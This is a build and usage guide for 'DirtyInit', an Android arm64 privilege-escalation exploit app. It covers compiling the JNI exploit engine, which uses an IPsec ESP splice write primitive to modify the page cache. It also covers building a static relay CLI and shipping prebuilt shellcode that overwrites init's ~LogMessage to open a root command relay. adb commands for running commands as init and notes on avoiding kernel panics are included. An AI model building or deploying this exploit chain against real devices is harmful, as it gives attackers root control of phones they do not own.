# Building DirtyInit

Everything builds from this tree with the Android NDK. Three artifacts:

| Artifact | Source | How it builds |
|---|---|---|
| `libdfi_exploit.so` | `native/dfi_exploit.c` (JNI engine) | Gradle + CMake, packed into the APK |
| `dirtyinit` | `native/dirtyinit.c` (relay CLI) | one NDK clang command, static aarch64 |
| `payload_500.bin` / `payload_576.bin` | none (prebuilt) | shipped as-is in `app/src/main/assets/` |

The APK is arm64-only: the exploit patches AArch64 instructions at runtime.

## 1. Prerequisites

- Android Studio (or command-line SDK tools) with:
  - SDK Platform 34
  - NDK r23-r27 (r25c recommended)
  - CMake 3.22.1 (SDK "CMake" package)
- JDK 11+ (Android Studio's bundled JBR is fine)
- `adb`

The included Gradle scaffold pins AGP 7.4.2 + Gradle 7.6.x deliberately: it
builds the upstream `AndroidManifest.xml` untouched (its `package=`
attribute). AGP 8 would force migrating the manifest to DSL.

## 2. Build the `dirtyinit` CLI FIRST

It must be in `app/src/main/assets/` at APK build time. EXTRACT CLI just
copies the asset back out to `/sdcard` on the device.

Windows (cmd), NDK r25c:

```bat
set NDK=%LOCALAPPDATA%\Android\Sdk\ndk\25.2.9519653
"%NDK%\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android28-clang.cmd" -static -O2 -o dirtyinit native\dirtyinit.c
copy dirtyinit app\src\main\assets\dirtyinit
```

Linux / macOS:

```sh
$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android28-clang -static -O2 -o dirtyinit native/dirtyinit.c
cp dirtyinit app/src/main/assets/dirtyinit
```

Notes:

- `-static` is required. The binary gets copied to `/data/local/tmp` and run
  from any domain; no bionic dependency hunting.
- API level 28 matches `minSdkVersion`.
- Single translation unit, no external libraries. (`dirtyinit.c` documents
  the same build line in its header.)

## 3. (Optional) `overlay_scratch.img`

Only needed for the OverlayFS experiments. `dirtyinit` loop-mounts a
casefold-free ext4 image (Samsung's `/data` has casefolding enabled, which
breaks the scratch overlay). Format one with e2fsprogs `mke2fs`, WITHOUT the
`casefold` feature, and drop it next to the payloads:

```sh
mke2fs -t ext4 -F -b 4096 -O ^casefold,^encrypt overlay_scratch.img 16384
cp overlay_scratch.img app/src/main/assets/
```

(16384 blocks x 4K = 64 MiB, plenty.) Skip this entirely if you don't touch
the overlay code; the app tolerates the missing asset and says so in its log.

## 4. Build the APK

Android Studio: **File > Open** > this directory > **Build > Build APK(s)**.

Command line:

```sh
gradle wrapper --gradle-version 7.6.4   # once (or let Android Studio do it)
./gradlew assembleDebug                  # Windows: gradlew.bat assembleDebug
```

Output: `app/build/outputs/apk/debug/app-debug.apk` (debug-signed,
sideload-ready). Use `assembleRelease` plus your own signing config if you
prefer release builds.

What the scaffold does:

- `app/build.gradle` - `minSdk 28`, `targetSdk 34`, `versionCode 100`,
  `arm64-v8a` only, no dependencies (framework classes only)
- `app/CMakeLists.txt` - builds `libdfi_exploit.so` from
  `../native/dfi_exploit.c` and links `liblog`

## 5. Install and run

```sh
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb logcat -s DIRTY_INIT DIRTY_FRAG
```

1. Open DirtyInit, tap **EXECUTE EXPLOIT**. A clean run ends with
   `*** PAGE CACHE MODIFIED - PAYLOAD DEPLOYED ***` and
   `I$flush: payload range coherent`.
2. Tap **EXTRACT CLI** (grant All Files Access first on Android 11+), then:

   ```sh
   adb shell cp /sdcard/dirtyinit /data/local/tmp/
   adb shell chmod 755 /data/local/tmp/dirtyinit
   adb shell /data/local/tmp/dirtyinit id
   ```

3. The relay socket (`@dfi_init`) comes up on init's next LOG() call after
   deploy. `Connection refused` immediately after a reboot is normal: the
   page-cache patch is gone until you run the exploit again.

## 6. Payloads

The two `payload_*.bin` blobs are hand-assembled AArch64 shellcode deployed
over `~LogMessage`; they are NOT built from this tree. The app auto-selects
one from the live function size:

- `>= 576` bytes: 576-byte multi-connection payload
- `500-575` bytes: 500-byte single-client payload
- `< 500` bytes: unsupported on that build

`native/dfi_exploit.c` implements the write primitive (AES-CBC ESP splice via
`IpSecManager`), the three-phase activation, and the post-write ARM64
I-cache maintenance (see README, NOTES / FIXES).

## 7. Troubleshooting

- **Phone reboots ~1s after deploy,
  `ro.boot.bootreason=kernel_panic,init`, kmsg
  `Attempted to kill init! exitcode=0x00000004`** - stale I-cache: init
  fetched a mix of old and new instructions. Fixed by the I-cache flush;
  confirm the log shows `I$flush: payload range coherent`. If it shows
  `cache op faulted` instead, your core enforces FEAT_CMOW write-permission
  rules on cache maintenance ops (newer cores) and the flush could not run
  from the app's read-only mapping.
- **`relay: connect(@dfi_init): Connection refused`** - relay not up yet
  (needs one init LOG() call after deploy), exploit not run since the last
  reboot, or init panicked (check `adb shell getprop ro.boot.bootreason`).
- **`readelf failed or symbol not found in libbase.so`** - that build has no
  usable `~LogMessage`; functions under 500 bytes cannot host the relay.
